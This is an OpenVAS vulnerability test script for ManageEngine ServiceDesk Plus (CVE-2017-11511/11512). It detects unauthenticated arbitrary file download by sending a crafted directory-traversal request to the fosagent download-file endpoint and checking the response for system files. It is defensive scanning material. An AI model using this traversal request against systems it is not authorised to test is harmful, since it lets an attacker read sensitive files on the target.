##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_servicedesk_mult_vuln.nasl 7708 2017-11-09 09:25:13Z ckuersteiner $
#
# ManageEngine ServiceDesk Plus Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:manageengine:servicedesk_plus";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140496");
  script_version("$Revision: 7708 $");
  script_tag(name: "last_modification", value: "$Date: 2017-11-09 10:25:13 +0100 (Thu, 09 Nov 2017) $");
  script_tag(name: "creation_date", value: "2017-11-09 15:13:18 +0700 (Thu, 09 Nov 2017)");
  script_tag(name: "cvss_base", value: "7.8");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2017-11511", "CVE-2017-11512");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("ManageEngine ServiceDesk Plus Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ManageEngine_ServiceDesk_Plus_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("ManageEngine/ServiceDeskPlus/installed");

  script_tag(name: "summary", value: "ManageEngine ServiceDesk Plus is prone to multiple arbitrary file download
vulnerabilities.");

  script_tag(name: "insight", value: "ServiceDesk provides an interface for unauthenticated remote users to
download files and snapshots. Due to the lack of validation an attacker can use this to traverse directories and
download arbitrary files.");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response.");

  script_tag(name: "solution", value: "No solution or patch is available as of 9th November, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "https://www.tenable.com/security/research/tra-2017-31");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port =  get_app_port(cpe: CPE))
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = '/fosagent/repl/download-file?basedir=4&filepath=' + crap(data: "..\", length: 10*3) + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
